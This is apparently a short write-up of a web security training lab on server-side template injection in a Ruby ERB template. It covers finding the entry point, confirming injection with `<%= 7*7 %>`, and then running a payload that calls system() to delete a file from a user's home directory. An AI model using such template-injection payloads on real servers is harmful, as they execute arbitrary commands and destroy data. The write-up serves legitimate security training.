
Lab Objective: Delete the `morale.txt` file from Carlos's home directory.

Lab Tips: This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template

Lab Normal Page

![](images/Pasted%20image%2020260624060147.png)


**Ethical Hacking Process:**

*Recon*

Recon Objective: Find an injection entry point

![](images/Pasted%20image%2020260624060214.png)

Found by clicking the first product.



*Vulnerability Scanning:*

Test Payload: `<%= 7*7 %>`

The payload must return 49 as an expected result

![[Pasted image 20260624060705.png]]

Page Reaction

![[Pasted image 20260624060738.png]]

It executes! so it is vulnerable


*Exploitation:*

Proceeding to the main objective which is to delete the `morale.txt` file from Carlos's home directory.

Payload: `<%= system("rm /home/carlos/morale.txt") %>`

![[Pasted image 20260624060807.png]]

![[Pasted image 20260624060820.png]]




